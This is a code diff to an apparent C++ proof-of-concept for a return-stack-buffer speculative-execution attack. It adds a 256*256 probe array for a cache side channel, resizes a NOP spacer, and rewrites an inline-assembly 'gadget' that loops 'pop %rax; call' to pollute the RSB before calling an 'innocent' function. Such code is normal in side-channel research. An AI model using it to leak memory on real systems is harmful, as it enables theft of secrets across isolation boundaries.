@@ -4,6 +4,8 @@
 
 using namespace std;
 
+char array[256*256];
+
 // char array[256*256];
 
 // volatile int foo(){
@@ -40,7 +42,7 @@ using namespace std;
 
 volatile void spacer() {
 	asm(
-		".rept 2197;"
+		".rept 2202;"
 		"nop;"
 		".endr;"
 	);
@@ -48,12 +50,9 @@ volatile void spacer() {
 
 void gadget() {
 	asm(
-		".rept 5;"
-		"nop;"
-		".endr;"
-		"myLabel:"
+		"lbl:"
 		"pop %rax;"
-		"call myLabel;"
+		"call lbl;"
 	);
 }
 
@@ -62,8 +61,9 @@ int main(int argc, char *argv[]){
 		printf("doing nothing\n");
 		while(1) {}
 	}
-	printf("poluting rsb\n");
+	printf("polluting rsb\n");
 	gadget();
+	innocent();
 
 	// string buffer;
 	// char temp;
